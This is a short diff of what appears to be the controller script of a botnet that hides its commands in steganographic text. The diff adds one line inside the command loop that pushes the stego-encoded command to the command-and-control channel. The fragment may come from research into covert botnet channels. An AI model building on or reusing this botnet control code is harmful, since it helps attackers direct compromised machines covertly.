@@ -68,6 +68,7 @@ while keepBotmasterActive:
     logger.debug("Stego-text: {0}".format(stegoText))
 
     #If we get here there is a stego-text. Now push the stego-text to the C&C.
-    
+    c2Module.push(stegoText=stegoText)
+
 
     logger.debug("End of command loop")
